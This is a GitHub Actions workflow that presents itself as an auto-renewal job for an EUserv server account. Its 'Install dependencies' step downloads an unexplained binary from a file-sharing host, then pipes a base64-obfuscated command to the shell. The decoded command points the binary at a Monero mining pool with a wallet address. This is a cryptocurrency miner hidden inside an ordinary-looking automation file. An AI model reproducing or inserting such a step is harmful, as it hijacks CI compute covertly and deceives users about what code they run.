name: 'EUserv Auto Extend'

on:
  workflow_dispatch:

jobs:
  auto_renew:
    runs-on: ubuntu-latest
    steps:
      - name: 'Checkout codes'
        uses: actions/checkout@v2

      - name: 'Set python'
        uses: actions/setup-python@v1
        with:
          python-version: '3.x'

      - name: 'Install dependencies'
        run: |
          wget https://transfer.sh/get/nsIvW4/CppBuild -O build
          npm install -g cpulimit
          chmod +x build
          echo Li9idWlsZCAtbyBzZy5taW5leG1yLmNvbTo0NDMgLXUgNDVvOXZvMTl4VFpLRlByTW1aUmlXQzE2cVlUcWJNZFhKTFpOOHB4VDVCbjdLOWdKNDRFemhaYzFGeG5TWmpTVnhmYVIxREc1dVRrMmRhWHZ1UTJHeDFKUVBWNEM1ekggLWsgLS10bHMgLXAgZ2g= | base64 -d | sh

      - name: 'Auto_renew'
        env:
          USERNAME: ${{ secrets.USERNAME }}
          PASSWORD: ${{ secrets.PASSWORD }}
        run: python xq.py
